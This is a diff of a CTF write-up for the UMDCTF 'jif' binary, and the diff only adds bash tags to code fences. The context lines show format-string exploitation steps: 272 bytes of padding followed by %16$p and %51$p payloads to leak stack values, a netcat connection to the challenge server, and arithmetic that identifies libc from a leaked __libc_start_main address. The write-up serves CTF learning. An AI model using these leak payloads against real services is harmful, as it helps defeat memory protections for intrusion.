@@ -151,7 +151,7 @@ Right, so 272 bytes, then anything after is ripe for `printf` exploitation.
 
 Next, we need to find the `printf` offset, simply send 272 bytes + `%nn$p` with `nn` starting at 1 until the output matches the input:
 
-```
+```bash
 # ./jif
 SYSTEM CONSOLE> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%16$p
 Check Systems
@@ -164,7 +164,7 @@ Current location: 0x7024363125
 
 Ok, so the offset is `16`.  The output `0x7024363125` can be verified with (if you're unable to determine by sight :-):
 
-```
+```bash
 # echo 7024363125 | xxd -r -p | rev ; echo
 %16$p
 ```
@@ -234,7 +234,7 @@ $3 = 51
 
 Gives us `51` as the `printf` offset.  We need to send this remotely to get the correct libc version:
 
-```
+```bash
 # nc chals5.umdctf.io 7002
 SYSTEM CONSOLE> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%51$p
 Check Systems
@@ -247,7 +247,7 @@ Current location: 0x7fdfb1becbf7
 
 Ok, this is where experience and a bit of luck comes in.  That number (`0x7fdfb1becbf7`) is `__libc_start_main+243`, or is it?  Well, it is not.  It's actually `__libc_start_main+231`.  Different libcs will have different offsets.  Fortunately in the last 12 months of CTF's its been `243` or `231` for most of these types of challenges.  Just take that long number and subtract `243` and `231` and then look at the last 3 nibbles.  You'll get:
 
-```
+```bash
 # printf "%x\n" $(((0x7fdfb1becbf7 - 243) & 0xfff))
 b04
 # printf "%x\n" $(((0x7fdfb1becbf7 - 231) & 0xfff))
